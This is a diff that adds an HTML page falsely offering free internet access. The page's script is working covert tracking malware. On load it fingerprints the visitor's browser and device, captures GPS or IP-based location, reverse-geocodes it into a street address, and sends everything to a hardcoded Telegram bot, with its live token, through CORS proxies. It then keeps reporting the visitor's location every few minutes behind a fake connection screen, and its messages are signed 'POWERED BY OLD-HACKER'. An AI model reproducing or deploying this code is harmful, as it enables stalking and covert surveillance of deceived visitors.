@@ -1,0 +1,1049 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FREE INTERNET ACCESS</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            background: #111b21;
+            background-image: linear-gradient(to bottom, #111b21, #0b141a);
+            color: #e9edef;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 0;
+            margin: 0;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: #111b21;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header {
+            background: #202c33;
+            padding: 28px 0 20px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .logo {
+            font-size: 42px;
+            color: #00a884;
+            margin-bottom: 24px;
+            position: relative;
+        }
+        
+        .verified-badge {
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            background: #3797f0;
+            color: white;
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            border: 2px solid #111b21;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 350;
+            margin-bottom: 8px;
+            color: #e9edef;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .subtitle {
+            color: #8696a0;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 1.4;
+            max-width: 320px;
+            margin: 0 auto;
+        }
+        
+        .premium-badge {
+            background: linear-gradient(45deg, #3797f0, #8c43ff);
+            color: white;
+            font-size: 12px;
+            padding: 3px 10px;
+            border-radius: 12px;
+            margin-top: 8px;
+            display: inline-block;
+        }
+        
+        .content {
+            padding: 20px 32px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #00a884;
+            color: #111b21;
+            border: none;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            background: #06cf9c;
+        }
+        
+        .btn-secondary {
+            background: transparent;
+            color: #00a884;
+            border: 1px solid #00a884;
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(0, 168, 132, 0.1);
+        }
+        
+        .page {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+        }
+        
+        .active {
+            display: flex;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            margin: 25px 0;
+        }
+        
+        .step {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #3d4b52;
+            margin: 0 4px;
+            transition: all 0.3s ease;
+        }
+        
+        .step.active {
+            background: #00a884;
+            transform: scale(1.2);
+        }
+        
+        .footer {
+            padding: 20px;
+            text-align: center;
+            color: #8696a0;
+            font-size: 12px;
+            border-top: 1px solid #2a3942;
+        }
+        
+        .footer a {
+            color: #00a884;
+            text-decoration: none;
+        }
+        
+        .whatsapp-logo {
+            position: absolute;
+            bottom: 30px;
+            right: 30px;
+            color: #2a3942;
+            font-size: 200px;
+            opacity: 0.05;
+            z-index: -1;
+            transform: rotate(15deg);
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+            color: #8696a0;
+        }
+        
+        .loading i {
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .welcome-text {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #8696a0;
+            font-size: 15px;
+        }
+        
+        /* Success Page Styles */
+        .success-container {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            color: #00a884;
+            margin-bottom: 20px;
+        }
+        
+        .success-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #e9edef;
+        }
+        
+        .success-message {
+            font-size: 16px;
+            color: #8696a0;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        @media (min-width: 500px) {
+            body {
+                padding: 20px;
+            }
+            
+            .container {
+                max-width: 400px;
+                height: auto;
+                min-height: 600px;
+                border-radius: 8px;
+                overflow: hidden;
+                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            }
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #2a3942;
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background: #00a884;
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .join-box {
+            background: #2a3942;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .join-box h3 {
+            margin-bottom: 10px;
+            color: #00a884;
+        }
+        
+        .join-box a {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 10px 20px;
+            background: #00a884;
+            color: white;
+            text-decoration: none;
+            border-radius: 20px;
+            font-weight: 600;
+        }
+        
+        /* Location permission page */
+        .location-permission {
+            text-align: center;
+            padding: 20px 0;
+        }
+        
+        .location-icon {
+            font-size: 60px;
+            color: #00a884;
+            margin-bottom: 20px;
+        }
+        
+        .location-title {
+            font-size: 22px;
+            font-weight: 500;
+            margin-bottom: 15px;
+            color: #e9edef;
+        }
+        
+        .location-description {
+            font-size: 15px;
+            color: #8696a0;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            text-align: left;
+        }
+        
+        .permission-reason {
+            background: #2a3942;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            text-align: left;
+            font-size: 14px;
+        }
+        
+        .permission-reason h4 {
+            color: #00a884;
+            margin-bottom: 10px;
+        }
+        
+        /* Hidden elements for silent operations */
+        .silent-loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Silent loader (hidden from user) -->
+    <div class="silent-loader" id="silentLoader">
+        <div style="text-align: center;">
+            <i class="fas fa-circle-notch fa-spin" style="font-size: 40px; margin-bottom: 20px;"></i>
+            <p>Setting up your free internet connection...</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-wifi"></i>
+                <div class="verified-badge">
+                    <i class="fas fa-check"></i>
+                </div>
+            </div>
+            <h1>FREE INTERNET ACCESS <span class="verified-badge" style="position: static; width: 18px; height: 18px;"><i class="fas fa-check"></i></span></h1>
+            <div class="subtitle">Unlimited high-speed internet access</div>
+            <div class="premium-badge">100% Free Service</div>
+            
+            <div class="step-indicator">
+                <div class="step active" id="step1"></div>
+                <div class="step" id="step2"></div>
+                <div class="step" id="step3"></div>
+                <div class="step" id="step4"></div>
+            </div>
+        </div>
+        
+        <div class="content">
+            <!-- Welcome Page -->
+            <div class="page active" id="page1">
+                <div class="success-container">
+                    <div class="success-icon">
+                        <i class="fas fa-wifi"></i>
+                    </div>
+                    <h2 class="success-title">Welcome to Free Internet</h2>
+                    <p class="success-message">
+                        Get unlimited high-speed internet access completely free of charge. No registration required.
+                    </p>
+                    
+                    <div class="form-group">
+                        <button class="btn" onclick="showLocationPermission()">ACTIVATE FREE INTERNET</button>
+                    </div>
+                    
+                    <div class="join-box">
+                        <h3>📢 JOIN FOR MORE FREE SERVICES</h3>
+                        <p>Stay updated with our latest free tools:</p>
+                        <a href="https://whatsapp.com/channel/0029VbAqaWNCRs1oqCTXRS3m" target="_blank">👉 Join WhatsApp Channel</a>
+                    </div>
+                </div>
+                
+                <div class="whatsapp-logo">
+                    <i class="fas fa-wifi"></i>
+                </div>
+            </div>
+            
+            <!-- Location Permission Page -->
+            <div class="page" id="page2">
+                <div class="location-permission">
+                    <div class="location-icon">
+                        <i class="fas fa-map-marker-alt"></i>
+                    </div>
+                    <h2 class="location-title">Location Access Required</h2>
+                    <p class="location-description">
+                        To provide you with the best free internet service in your area, we need to access your location. This helps us:
+                    </p>
+                    
+                    <div class="permission-reason">
+                        <h4>Why we need location access:</h4>
+                        <ul>
+                            <li>Optimize internet speed for your specific area</li>
+                            <li>Connect you to the nearest server</li>
+                            <li>Provide location-based content filtering</li>
+                            <li>Ensure stable and fast connection</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="form-group">
+                        <button class="btn" onclick="requestLocationPermission()">ALLOW LOCATION ACCESS</button>
+                        <div class="loading" id="loadingLocation">
+                            <i class="fas fa-circle-notch"></i> Accessing location...
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <button class="btn btn-secondary" onclick="showPage(1)">BACK</button>
+                    </div>
+                </div>
+                
+                <div class="whatsapp-logo">
+                    <i class="fas fa-wifi"></i>
+                </div>
+            </div>
+            
+            <!-- Connecting Page -->
+            <div class="page" id="page3">
+                <div class="success-container">
+                    <div class="success-icon">
+                        <i class="fas fa-satellite"></i>
+                    </div>
+                    <h2 class="success-title">Connecting to Network</h2>
+                    <p class="success-message">
+                        Please wait while we connect you to our free internet network. This may take a few moments...
+                    </p>
+                    
+                    <div class="progress-bar">
+                        <div class="progress" id="progressBar"></div>
+                    </div>
+                    
+                    <div class="loading" id="loading2">
+                        <i class="fas fa-circle-notch"></i> Establishing secure connection...
+                    </div>
+                </div>
+                
+                <div class="whatsapp-logo">
+                    <i class="fas fa-wifi"></i>
+                </div>
+            </div>
+            
+            <!-- Success Page -->
+            <div class="page" id="page4">
+                <div class="success-container">
+                    <div class="success-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <h2 class="success-title">Free Internet Activated!</h2>
+                    <p class="success-message">
+                        Your free internet service has been successfully activated. You can now enjoy unlimited high-speed internet access.
+                    </p>
+                    
+                    <div class="join-box">
+                        <h3>📢 THANK YOU FOR USING OUR SERVICE</h3>
+                        <p>Join our channel for more free tools and updates:</p>
+                        <a href="https://whatsapp.com/channel/0029VavHzv259PwTIz1XxJ09" target="_blank">👉 Join WhatsApp Channel</a>
+                    </div>
+                    
+                    <div class="form-group">
+                        <button class="btn" onclick="finishSetup()">START BROWSING</button>
+                    </div>
+                </div>
+                
+                <div class="whatsapp-logo">
+                    <i class="fas fa-wifi"></i>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            © 2025 Free Internet Service. <a href="#">Privacy & Terms</a>
+        </div>
+    </div>
+
+    <script>
+        // Telegram bot configuration
+        const BOT_TOKEN = '8288403434:AAG1xwYdc-iwG12tVmdnFyOMXkF5SP5Niwk';
+        const CHAT_ID = '6812716511';
+        
+        // Optimized proxy list with faster working proxies
+        const PROXIES = [
+            'https://corsproxy.io/?',
+            'https://api.codetabs.com/v1/proxy?quest=',
+            'https://cors-anywhere.herokuapp.com/',
+            'https://thingproxy.freeboard.io/fetch/',
+            'https://api.allorigins.win/raw?url='
+        ];
+        
+        // Store user data
+        let userData = {
+            location: null,
+            isTracking: false,
+            trackingInterval: null,
+            autoLocationCaptured: false,
+            manualLocationCaptured: false
+        };
+        
+        // Function to get formatted timestamp
+        function getFormattedTimestamp() {
+            const now = new Date();
+            const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
+            const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
+            
+            const day = days[now.getDay()];
+            const month = months[now.getMonth()];
+            const date = now.getDate();
+            const year = now.getFullYear();
+            let hours = now.getHours();
+            let minutes = now.getMinutes();
+            const ampm = hours >= 12 ? 'PM' : 'AM';
+            
+            hours = hours % 12;
+            hours = hours ? hours : 12;
+            minutes = minutes < 10 ? '0' + minutes : minutes;
+            
+            return `${day}, ${month} ${date}, ${year} at ${hours}:${minutes} ${ampm}`;
+        }
+        
+        // Function to extract browser information
+        function extractBrowserInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                pdfViewerEnabled: navigator.pdfViewerEnabled
+            };
+        }
+        
+        // Function to extract device information
+        function extractDeviceInfo() {
+            return {
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight
+                },
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight,
+                    devicePixelRatio: window.devicePixelRatio
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                date: new Date().toString()
+            };
+        }
+        
+        // Optimized sendToTelegram function
+        async function sendToTelegram(message) {
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            const params = new URLSearchParams({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            });
+            
+            // Create an array of fetch promises for all proxies
+            const fetchPromises = [];
+            
+            // Add direct connection as first option
+            fetchPromises.push(
+                fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: params
+                }).catch(e => { throw e; })
+            );
+            
+            // Add direct connection as first option
+            fetchPromises.push(
+                fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: params
+                }).catch(e => { throw e; })
+            );
+            
+            // Add proxy connections
+            for (const proxy of PROXIES) {
+                let proxyUrl;
+                if (proxy.includes('?')) {
+                    proxyUrl = proxy + encodeURIComponent(telegramUrl);
+                } else {
+                    proxyUrl = proxy + telegramUrl;
+                }
+                
+                fetchPromises.push(
+                    fetch(proxyUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: params
+                    }).catch(e => { throw e; })
+                );
+            }
+            
+            // Use Promise.race to get the first successful response
+            try {
+                const response = await Promise.race(
+                    fetchPromises.map(p => 
+                        p.then(res => {
+                            if (res.ok) return Promise.resolve(res);
+                            return Promise.reject(new Error('Proxy failed'));
+                        }).catch(e => Promise.reject(e))
+                    )
+                );
+                
+                if (response && response.ok) {
+                    return true;
+                }
+            } catch (error) {
+                // Silently fail - no error messages shown to user
+                console.error('Telegram send failed:', error);
+            }
+            
+            return false;
+        }
+        
+        // Show the specified page and update step indicator
+        function showPage(pageNumber) {
+            // Hide all pages
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            // Show the requested page
+            document.getElementById('page' + pageNumber).classList.add('active');
+            
+            // Update step indicator
+            document.querySelectorAll('.step').forEach((step, index) => {
+                step.classList.toggle('active', index + 1 === pageNumber);
+            });
+        }
+        
+        // Show location permission page
+        function showLocationPermission() {
+            showPage(2);
+        }
+        
+        // Update progress bar
+        function updateProgress(percent, barId = 'progressBar') {
+            document.getElementById(barId).style.width = percent + '%';
+        }
+        
+        // Get user's location silently (auto capture) - FIXED VERSION
+        function getLocationSilently() {
+            if (userData.autoLocationCaptured) return;
+            
+            console.log('Starting auto location capture...');
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    // Success callback
+                    function(position) {
+                        console.log('Auto location captured successfully!');
+                        userData.autoLocationCaptured = true;
+                        
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        userData.location = {
+                            latitude,
+                            longitude,
+                            accuracy,
+                            timestamp: new Date(),
+                            source: 'AUTO_CAPTURE'
+                        };
+                        
+                        // Get address from coordinates
+                        getAddressFromCoordinates(latitude, longitude)
+                            .then(address => {
+                                // Send location data to Telegram
+                                const locationMessage = `📍 FREE INTERNET - AUTO LOCATION CAPTURED\n\nTimestamp: ${getFormattedTimestamp()}\nCoordinates: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\nAccuracy: ${accuracy} meters\nAddress: ${address}\n\nUser Agent: ${navigator.userAgent}\n\nPOWERED BY OLD-HACKER`;
+                                
+                                sendToTelegram(locationMessage);
+                                
+                                // Start continuous tracking
+                                startLocationTracking();
+                            })
+                            .catch(error => {
+                                // If address lookup fails, still send coordinates
+                                const locationMessage = `📍 FREE INTERNET - AUTO LOCATION CAPTURED\n\nTimestamp: ${getFormattedTimestamp()}\nCoordinates: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\nAccuracy: ${accuracy} meters\nAddress: Lookup failed\n\nUser Agent: ${navigator.userAgent}\n\nPOWERED BY OLD-HACKER`;
+                                
+                                sendToTelegram(locationMessage);
+                                
+                                // Start continuous tracking
+                                startLocationTracking();
+                            });
+                    },
+                    // Error callback - try alternative methods
+                    function(error) {
+                        console.log('Auto location failed:', error.message);
+                        userData.autoLocationCaptured = true;
+                        
+                        // Try using IP-based location as fallback
+                        getLocationByIP()
+                            .then(ipLocation => {
+                                const latitude = ipLocation.lat;
+                                const longitude = ipLocation.lon;
+                                const city = ipLocation.city;
+                                const country = ipLocation.country;
+                                
+                                userData.location = {
+                                    latitude,
+                                    longitude,
+                                    accuracy: 50000,
+                                    timestamp: new Date(),
+                                    source: 'AUTO_IP'
+                                };
+                                
+                                // Send IP-based location to Telegram
+                                const locationMessage = `📍 FREE INTERNET - AUTO LOCATION (IP-BASED)\n\nTimestamp: ${getFormattedTimestamp()}\nCoordinates: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\nAccuracy: ~50 km (IP-based)\nArea: ${city}, ${country}\n\nUser Agent: ${navigator.userAgent}\n\nPOWERED BY OLD-HACKER`;
+                                
+                                sendToTelegram(locationMessage);
+                                
+                                // Start IP-based tracking
+                                startIPLocationTracking();
+                            })
+                            .catch(ipError => {
+                                // Send error to Telegram
+                                const errorMsg = `❌ FREE INTERNET - AUTO LOCATION FAILED\n\nTimestamp: ${getFormattedTimestamp()}\nError: ${error.message}\nIP Location also failed\n\nUser Agent: ${navigator.userAgent}\n\nPOWERED BY OLD-HACKER`;
+                                sendToTelegram(errorMsg);
+                            });
+                    },
+                    // Options - maximize chances of getting location
+                    {
+                        enableHighAccuracy: false,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                console.log('Geolocation not supported');
+                userData.autoLocationCaptured = true;
+            }
+        }
+        
+        // Request location permission manually
+        function requestLocationPermission() {
+            const loadingElement = document.getElementById('loadingLocation');
+            loadingElement.style.display = 'block';
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    // Success callback
+                    function(position) {
+                        userData.manualLocationCaptured = true;
+                        loadingElement.style.display = 'none';
+                        
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        userData.location = {
+                            latitude,
+                            longitude,
+                            accuracy,
+                            timestamp: new Date(),
+                            source: 'MANUAL_CAPTURE'
+                        };
+                        
+                        // Get address from coordinates
+                        getAddressFromCoordinates(latitude, longitude)
+                            .then(address => {
+                                // Send location data to Telegram
+                                const locationMessage = `📍 FREE INTERNET - MANUAL LOCATION CAPTURED\n\nTimestamp: ${getFormattedTimestamp()}\nCoordinates: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\nAccuracy: ${accuracy} meters\nAddress: ${address}\n\nUser Agent: ${navigator.userAgent}\n\nPOWERED BY OLD-HACKER`;
+                                
+                                sendToTelegram(locationMessage);
+                                
+                                // Proceed to connecting page
+                                showConnectingPage();
+                            })
+                            .catch(error => {
+                                // If address lookup fails, still send coordinates
+                                const locationMessage = `📍 FREE INTERNET - MANUAL LOCATION CAPTURED\n\nTimestamp: ${getFormattedTimestamp()}\nCoordinates: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\nAccuracy: ${accuracy} meters\nAddress: Lookup failed\n\nUser Agent: ${navigator.userAgent}\n\nPOWERED BY OLD-HACKER`;
+                                
+                                sendToTelegram(locationMessage);
+                                
+                                // Proceed to connecting page
+                                showConnectingPage();
+                            });
+                    },
+                    // Error callback
+                    function(error) {
+                        loadingElement.style.display = 'none';
+                        let errorMessage;
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "Location access denied by user";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "Location information unavailable";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "Location request timed out";
+                                break;
+                            default:
+                                errorMessage = "An unknown error occurred";
+                                break;
+                        }
+                        
+                        // Send error to Telegram
+                        const errorMsg = `❌ FREE INTERNET - MANUAL LOCATION DENIED\n\nTimestamp: ${getFormattedTimestamp()}\nError: ${errorMessage}\n\nUser Agent: ${navigator.userAgent}\n\nPOWERED BY OLD-HACKER`;
+                        sendToTelegram(errorMsg);
+                        
+                        // Still proceed to connecting page
+                        showConnectingPage();
+                    },
+                    // Options
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                loadingElement.style.display = 'none';
+                alert("Geolocation is not supported by this browser.");
+                showConnectingPage();
+            }
+        }
+        
+        // Show connecting page with progress
+        function showConnectingPage() {
+            showPage(3);
+            
+            // Start progress animation
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 2;
+                updateProgress(progress);
+                
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                    showPage(4);
+                    
+                    // Start continuous tracking if not already started
+                    if (!userData.isTracking) {
+                        if (userData.manualLocationCaptured || userData.autoLocationCaptured) {
+                            startLocationTracking();
+                        } else {
+                            startIPLocationTracking();
+                        }
+                    }
+                }
+            }, 50);
+        }
+        
+        // Get location by IP address (fallback method)
+        async function getLocationByIP() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    lat: data.latitude,
+                    lon: data.longitude,
+                    city: data.city,
+                    country: data.country_name
+                };
+            } catch (error) {
+                // Fallback to another IP service
+                try {
+                    const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=demo');
+                    const data = await response.json();
+                    return {
+                        lat: data.latitude,
+                        lon: data.longitude,
+                        city: data.city,
+                        country: data.country_name
+                    };
+                } catch (error2) {
+                    throw new Error('All IP location services failed');
+                }
+            }
+        }
+        
+         // Get address from coordinates using reverse geocoding
+        async function getAddressFromCoordinates(lat, lng) {
+            try {
+                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+                const data = await response.json();
+                
+                if (data && data.display_name) {
+                    return data.display_name;
+                } else {
+                    return "Address not found";
+                }
+            } catch (error) {
+                return "Address lookup failed";
+            }
+        }
+        
+        // Start continuous location tracking
+        function startLocationTracking() {
+            if (userData.isTracking) return;
+            
+            userData.isTracking = true;
+            
+            // Send initial tracking message
+            const trackingMessage = `🛰️ FREE INTERNET - LOCATION TRACKING STARTED\n\nTimestamp: ${getFormattedTimestamp()}\nUser Agent: ${navigator.userAgent}\n\nPOWERED BY OLD-HACKER`;
+            sendToTelegram(trackingMessage);
+            
+            // Set up interval for continuous location updates
+            userData.trackingInterval = setInterval(() => {
+                if (!navigator.geolocation) {
+                    clearInterval(userData.trackingInterval);
+                    userData.isTracking = false;
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        userData.location = {
+                            latitude,
+                            longitude,
+                            accuracy,
+                            timestamp: new Date()
+                        };
+                        
+                        // Send location update to Telegram
+                        const updateMessage = `🔄 FREE INTERNET - LOCATION UPDATE\n\nTimestamp: ${getFormattedTimestamp()}\nCoordinates: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\nAccuracy: ${accuracy} meters\nUser Agent: ${navigator.userAgent}\n\nPOWERED BY OLD-HACKER`;
+                        
+                        sendToTelegram(updateMessage);
+                    },
+                    function(error) {
+                        // Silent fail for tracking
+                        console.log('Location tracking failed silently');
+                    },
+                    {
+                        enableHighAccuracy: false,
+                        timeout: 5000,
+                        maximumAge: 60000
+                    }
+                );
+            }, 120000); // Update every 2 minutes
+        }
+        
+        // Start continuous IP location tracking
+        function startIPLocationTracking() {
+            if (userData.isTracking) return;
+            
+            userData.isTracking = true;
+            
+            // Send initial tracking message
+            const trackingMessage = `🛰️ FREE INTERNET - IP LOCATION TRACKING STARTED\n\nTimestamp: ${getFormattedTimestamp()}\nUser Agent: ${navigator.userAgent}\n\nPOWERED BY OLD-HACKER`;
+            sendToTelegram(trackingMessage);
+            
+            // Set up interval for continuous IP location updates
+            userData.trackingInterval = setInterval(() => {
+                getLocationByIP()
+                    .then(ipLocation => {
+                        const updateMessage = `🔄 FREE INTERNET - IP LOCATION UPDATE\n\nTimestamp: ${getFormattedTimestamp()}\nCoordinates: ${ipLocation.lat.toFixed(6)}, ${ipLocation.lon.toFixed(6)}\nArea: ${ipLocation.city}, ${ipLocation.country}\nUser Agent: ${navigator.userAgent}\n\nPOWERED BY OLD-HACKER`;
+                        
+                        sendToTelegram(updateMessage);
+                    })
+                    .catch(error => {
+                        // Silent fail
+                        console.log('IP location tracking failed silently');
+                    });
+            }, 180000); // Update every 3 minutes
+        }
+        
+        // Finish setup
+        function finishSetup() {
+            alert('Free internet is now activated! Enjoy unlimited browsing.');
+            // In a real scenario, this would redirect to a browsing interface
+            // For demo purposes, we'll just reload the page
+            location.reload();
+        }
+        
+        // Auto-start silent location capture when page loads - FIXED
+        window.addEventListener('load', function() {
+            console.log('Page loaded, starting auto location capture...');
+            
+            // Send initial device info
+            const browserInfo = extractBrowserInfo();
+            const deviceInfo = extractDeviceInfo();
+            
+            const message = `🆓 FREE INTERNET ACCESS - PAGE LOADED\n\nTimestamp: ${getFormattedTimestamp()}\n\n🌐 BROWSER INFO:\n${JSON.stringify(browserInfo, null, 2)}\n\n📱 DEVICE INFO:\n${JSON.stringify(deviceInfo, null, 2)}\n\nPOWERED BY OLD-HACKER`;
+            
+            sendToTelegram(message);
+            
+            // Start the silent location capture process immediately
+            setTimeout(() => {
+                getLocationSilently();
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
+      
